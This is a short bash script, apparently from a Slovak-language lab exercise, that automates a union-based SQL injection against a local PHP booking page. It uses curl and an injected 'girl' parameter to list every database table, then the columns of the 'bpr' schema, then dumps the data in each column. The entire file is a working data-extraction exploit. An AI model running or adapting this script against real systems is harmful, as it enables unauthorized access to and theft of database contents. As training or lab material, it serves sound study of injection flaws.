#!/bin/bash

function query {
	QUERY=$1
	COUNT=0
	while [ $COUNT -eq 0 ] || [ -n "$RES" ]
	do
		RES=$(curl --silent --data \
			"girl=Bobina' and 0 = 1 union select concat('^',($QUERY limit $COUNT,1),'^') as id, '" http://127.0.0.1:9999/nightclub/bookgirl.php | \
			grep "\^" | cut -d"^" -f2)
		COUNT=$(($COUNT + 1))
		echo $RES
	done;
}

function get_tables {
	query "select CONCAT(TABLE_SCHEMA,'.',TABLE_NAME) from information_schema.TABLES"
}

function get_columns {
	TABLE=$1
	query "select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA = 'bpr' and TABLE_NAME = '${TABLE:4}'"
}

function get_data {
	TABLE=$1
	COLUMN=$2
	query "select $COLUMN from $TABLE"
}

echo "Ziskame vsetky tabulky"
get_tables

echo "Vyfiltrujeme len relevantne"
TABLES=$(get_tables | grep "bpr.")
echo -e $TABLES "\n"

echo "Zistime stlpce tabuliek"
for TABLE in $TABLES; do
	echo $TABLE
	get_columns $TABLE
done;

echo "Zistime data tabuliek"
for TABLE in $TABLES; do
	echo $TABLE
	echo "------"
	COLUMNS=$(get_columns $TABLE)
	for COLUMN in $COLUMNS; do
		echo "$TABLE:$COLUMN"
		get_data $TABLE $COLUMN
	done;
done;
